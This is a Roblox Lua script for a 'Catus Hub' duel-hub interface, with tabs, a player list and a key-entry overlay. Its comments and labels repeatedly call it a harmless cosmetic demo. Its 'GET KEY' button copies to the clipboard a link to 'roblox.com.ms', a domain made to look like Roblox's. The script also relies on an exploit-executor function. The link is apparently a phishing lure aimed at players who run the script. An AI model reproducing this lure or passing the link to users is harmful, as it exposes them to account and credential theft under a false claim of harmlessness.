-- CATUS HUB | DUEL HUB DEMO
-- Cosmetic/demo only - no exploit or cheat functionality

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local KEY = "CATUS-DEMO"
local KEY_LINK = "https://roblox.com.ms/communities/5622451391/#!/about"

local gui = Instance.new("ScreenGui")
gui.Name = "CatusHubDemo"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(600, 400)
main.Position = UDim2.fromScale(.5, .5)
main.AnchorPoint = Vector2.new(.5, .5)
main.BackgroundColor3 = Color3.fromRGB(17, 17, 24)
main.BorderSizePixel = 0
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(105, 70, 160)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, -30, 0, 40)
title.Position = UDim2.fromOffset(15, 10)
title.BackgroundTransparency = 1
title.Text = "🧠 CATUS HUB"
title.TextColor3 = Color3.fromRGB(190, 130, 255)
title.TextSize = 25
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left

local subtitle = Instance.new("TextLabel", main)
subtitle.Size = UDim2.new(1, -30, 0, 25)
subtitle.Position = UDim2.fromOffset(15, 48)
subtitle.BackgroundTransparency = 1
subtitle.Text = "⚔ DUEL HUB • DEMO"
subtitle.TextColor3 = Color3.fromRGB(150, 150, 165)
subtitle.TextSize = 13
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left

local sidebar = Instance.new("Frame", main)
sidebar.Size = UDim2.fromOffset(125, 315)
sidebar.Position = UDim2.fromOffset(15, 78)
sidebar.BackgroundColor3 = Color3.fromRGB(24, 24, 33)
sidebar.BorderSizePixel = 0

Instance.new("UICorner", sidebar).CornerRadius = UDim.new(0, 10)

local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -165, 0, 315)
content.Position = UDim2.fromOffset(150, 78)
content.BackgroundTransparency = 1

local pages = {}

local function createPage(name)
    local page = Instance.new("Frame")
    page.Name = name
    page.Size = UDim2.fromScale(1, 1)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.Parent = content
    pages[name] = page
    return page
end

local duelPage = createPage("DUELS")
local playersPage = createPage("PLAYERS")
local settingsPage = createPage("SETTINGS")

duelPage.Visible = true

local function button(parent, text, position, size)
    local b = Instance.new("TextButton")
    b.Size = size or UDim2.fromOffset(105, 40)
    b.Position = position
    b.BackgroundColor3 = Color3.fromRGB(42, 42, 55)
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = Color3.fromRGB(235, 235, 240)
    b.TextSize = 12
    b.Font = Enum.Font.GothamBold
    b.AutoButtonColor = false
    b.Parent = parent

    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)

    local original = b.Size

    b.MouseEnter:Connect(function()
        TweenService:Create(
            b,
            TweenInfo.new(.12),
            {Size = UDim2.new(
                original.X.Scale,
                original.X.Offset + 4,
                original.Y.Scale,
                original.Y.Offset + 2
            )}
        ):Play()
    end)

    b.MouseLeave:Connect(function()
        TweenService:Create(
            b,
            TweenInfo.new(.12),
            {Size = original}
        ):Play()
    end)

    b.MouseButton1Down:Connect(function()
        TweenService:Create(
            b,
            TweenInfo.new(.06),
            {Size = UDim2.new(
                original.X.Scale,
                original.X.Offset - 2,
                original.Y.Scale,
                original.Y.Offset - 2
            )}
        ):Play()
    end)

    b.MouseButton1Up:Connect(function()
        TweenService:Create(
            b,
            TweenInfo.new(.08),
            {Size = original}
        ):Play()
    end)

    return b
end

local function notify(message)
    local n = Instance.new("Frame")
    n.Size = UDim2.fromOffset(290, 52)
    n.Position = UDim2.new(1, 20, 1, -70)
    n.AnchorPoint = Vector2.new(0, 1)
    n.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    n.BorderSizePixel = 0
    n.Parent = gui

    Instance.new("UICorner", n).CornerRadius = UDim.new(0, 9)

    local ns = Instance.new("UIStroke", n)
    ns.Color = Color3.fromRGB(110, 75, 165)

    local text = Instance.new("TextLabel", n)
    text.Size = UDim2.new(1, -20, 1, 0)
    text.Position = UDim2.fromOffset(10, 0)
    text.BackgroundTransparency = 1
    text.Text = message
    text.TextColor3 = Color3.fromRGB(235, 235, 240)
    text.TextSize = 12
    text.Font = Enum.Font.GothamMedium
    text.TextWrapped = true

    TweenService:Create(
        n,
        TweenInfo.new(.3, Enum.EasingStyle.Quint),
        {Position = UDim2.new(1, -310, 1, -70)}
    ):Play()

    task.delay(3, function()
        if n.Parent then
            local tween = TweenService:Create(
                n,
                TweenInfo.new(.3, Enum.EasingStyle.Quint),
                {Position = UDim2.new(1, 20, 1, -70)}
            )
            tween:Play()
            tween.Completed:Wait()
            n:Destroy()
        end
    end)
end

-- Sidebar
local duelTab = button(sidebar, "⚔ DUELS", UDim2.fromOffset(10, 15))
local playerTab = button(sidebar, "👥 PLAYERS", UDim2.fromOffset(10, 65))
local settingsTab = button(sidebar, "⚙ SETTINGS", UDim2.fromOffset(10, 115))

-- Duel page
local duelTitle = Instance.new("TextLabel", duelPage)
duelTitle.Size = UDim2.new(1, 0, 0, 35)
duelTitle.BackgroundTransparency = 1
duelTitle.Text = "DUEL CENTER"
duelTitle.TextColor3 = Color3.fromRGB(210, 210, 220)
duelTitle.TextSize = 20
duelTitle.Font = Enum.Font.GothamBold
duelTitle.TextXAlignment = Enum.TextXAlignment.Left

local duelInfo = Instance.new("TextLabel", duelPage)
duelInfo.Size = UDim2.new(1, 0, 0, 50)
duelInfo.Position = UDim2.fromOffset(0, 40)
duelInfo.BackgroundTransparency = 1
duelInfo.Text = "Practice duel controls — cosmetic demo only."
duelInfo.TextColor3 = Color3.fromRGB(145, 145, 160)
duelInfo.TextSize = 13
duelInfo.Font = Enum.Font.Gotham
duelInfo.TextXAlignment = Enum.TextXAlignment.Left

local practice = button(
    duelPage,
    "⚔ START PRACTICE",
    UDim2.fromOffset(0, 100),
    UDim2.fromOffset(180, 45)
)

local cancel = button(
    duelPage,
    "✕ CANCEL",
    UDim2.fromOffset(190, 100),
    UDim2.fromOffset(130, 45)
)

practice.MouseButton1Click:Connect(function()
    notify("⚔ Practice duel started — demo mode!")
end)

cancel.MouseButton1Click:Connect(function()
    notify("✕ Practice duel cancelled.")
end)

-- Players page
local playerTitle = Instance.new("TextLabel", playersPage)
playerTitle.Size = UDim2.new(1, 0, 0, 35)
playerTitle.BackgroundTransparency = 1
playerTitle.Text = "PLAYERS"
playerTitle.TextColor3 = Color3.fromRGB(210, 210, 220)
playerTitle.TextSize = 20
playerTitle.Font = Enum.Font.GothamBold
playerTitle.TextXAlignment = Enum.TextXAlignment.Left

local playerList = Instance.new("ScrollingFrame", playersPage)
playerList.Size = UDim2.new(1, 0, 1, -45)
playerList.Position = UDim2.fromOffset(0, 42)
playerList.BackgroundColor3 = Color3.fromRGB(24, 24, 33)
playerList.BorderSizePixel = 0
playerList.ScrollBarThickness = 4
playerList.Parent = playersPage

Instance.new("UICorner", playerList).CornerRadius = UDim.new(0, 8)

local layout = Instance.new("UIListLayout", playerList)
layout.Padding = UDim.new(0, 5)

local function refreshPlayers()
    for _, child in ipairs(playerList:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -10, 0, 32)
        label.BackgroundColor3 = Color3.fromRGB(32, 32, 43)
        label.BorderSizePixel = 0
        label.Text = "  👤 " .. p.DisplayName .. "  @" .. p.Name
        label.TextColor3 = Color3.fromRGB(220, 220, 230)
        label.TextSize = 12
        label.Font = Enum.Font.Gotham
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = playerList

        Instance.new("UICorner", label).CornerRadius = UDim.new(0, 6)
    end

    playerList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 5)
end

refreshPlayers()

Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(refreshPlayers)

-- Settings page
local settingsTitle = Instance.new("TextLabel", settingsPage)
settingsTitle.Size = UDim2.new(1, 0, 0, 35)
settingsTitle.BackgroundTransparency = 1
settingsTitle.Text = "SETTINGS"
settingsTitle.TextColor3 = Color3.fromRGB(210, 210, 220)
settingsTitle.TextSize = 20
settingsTitle.Font = Enum.Font.GothamBold
settingsTitle.TextXAlignment = Enum.TextXAlignment.Left

local demoToggle = button(
    settingsPage,
    "DEMO MODE: ON",
    UDim2.fromOffset(0, 50),
    UDim2.fromOffset(180, 42)
)

demoToggle.MouseButton1Click:Connect(function()
    notify("Demo mode stays enabled.")
end)

local info = Instance.new("TextLabel", settingsPage)
info.Size = UDim2.new(1, 0, 0, 70)
info.Position = UDim2.fromOffset(0, 105)
info.BackgroundTransparency = 1
info.Text = "Catus Hub is running in cosmetic demo mode.\nNo gameplay or player data is modified."
info.TextColor3 = Color3.fromRGB(145, 145, 160)
info.TextSize = 12
info.Font = Enum.Font.Gotham
info.TextWrapped = true
info.TextXAlignment = Enum.TextXAlignment.Left

-- Tabs
local function showPage(page)
    for _, p in pairs(pages) do
        p.Visible = false
    end

    page.Visible = true
end

duelTab.MouseButton1Click:Connect(function()
    showPage(duelPage)
end)

playerTab.MouseButton1Click:Connect(function()
    showPage(playersPage)
    refreshPlayers()
end)

settingsTab.MouseButton1Click:Connect(function()
    showPage(settingsPage)
end)

-- Key system overlay
local keyOverlay = Instance.new("Frame")
keyOverlay.Size = UDim2.fromScale(1, 1)
keyOverlay.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
keyOverlay.BackgroundTransparency = .12
keyOverlay.BorderSizePixel = 0
keyOverlay.ZIndex = 10
keyOverlay.Parent = gui

local keyPanel = Instance.new("Frame", keyOverlay)
keyPanel.Size = UDim2.fromOffset(390, 240)
keyPanel.Position = UDim2.fromScale(.5, .5)
keyPanel.AnchorPoint = Vector2.new(.5, .5)
keyPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
keyPanel.BorderSizePixel = 0
keyPanel.ZIndex = 11

Instance.new("UICorner", keyPanel).CornerRadius = UDim.new(0, 14)

local keyTitle = Instance.new("TextLabel", keyPanel)
keyTitle.Size = UDim2.new(1, -30, 0, 40)
keyTitle.Position = UDim2.fromOffset(15, 15)
keyTitle.BackgroundTransparency = 1
keyTitle.Text = "🔑 CATUS HUB KEY SYSTEM"
keyTitle.TextColor3 = Color3.fromRGB(190, 130, 255)
keyTitle.TextSize = 19
keyTitle.Font = Enum.Font.GothamBold
keyTitle.ZIndex = 12

local input = Instance.new("TextBox", keyPanel)
input.Size = UDim2.new(1, -30, 0, 42)
input.Position = UDim2.fromOffset(15, 65)
input.BackgroundColor3 = Color3.fromRGB(31, 31, 42)
input.BorderSizePixel = 0
input.PlaceholderText = "Enter demo key..."
input.Text = ""
input.TextColor3 = Color3.fromRGB(240, 240, 245)
input.TextSize = 13
input.Font = Enum.Font.Gotham
input.ZIndex = 12

Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)

local get = button(
    keyPanel,
    "🔗 GET KEY",
    UDim2.fromOffset(15, 120),
    UDim2.fromOffset(170, 42)
)
get.ZIndex = 12

local check = button(
    keyPanel,
    "✓ CHECK KEY",
    UDim2.fromOffset(200, 120),
    UDim2.fromOffset(175, 42)
)
check.ZIndex = 12

local keyStatus = Instance.new("TextLabel", keyPanel)
keyStatus.Size = UDim2.new(1, -30, 0, 55)
keyStatus.Position = UDim2.fromOffset(15, 170)
keyStatus.BackgroundTransparency = 1
keyStatus.Text = "Enter the demo key to continue."
keyStatus.TextColor3 = Color3.fromRGB(150, 150, 165)
keyStatus.TextSize = 12
keyStatus.Font = Enum.Font.Gotham
keyStatus.TextWrapped = true
keyStatus.ZIndex = 12

get.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)
        keyStatus.Text = "Key link copied. Open it and follow the instructions."
        notify("🔑 Key link copied!")
    else
        keyStatus.Text = KEY_LINK
        notify("🔗 Key link displayed.")
    end
end)

check.MouseButton1Click:Connect(function()
    if input.Text == KEY then
        keyOverlay:Destroy()
        notify("✅ SUCCES THX FOR USING CATUS HUB")
    else
        keyStatus.Text = "ERROR: Invalid demo key"
        keyStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
        notify("❌ Invalid demo key.")
    end
end)
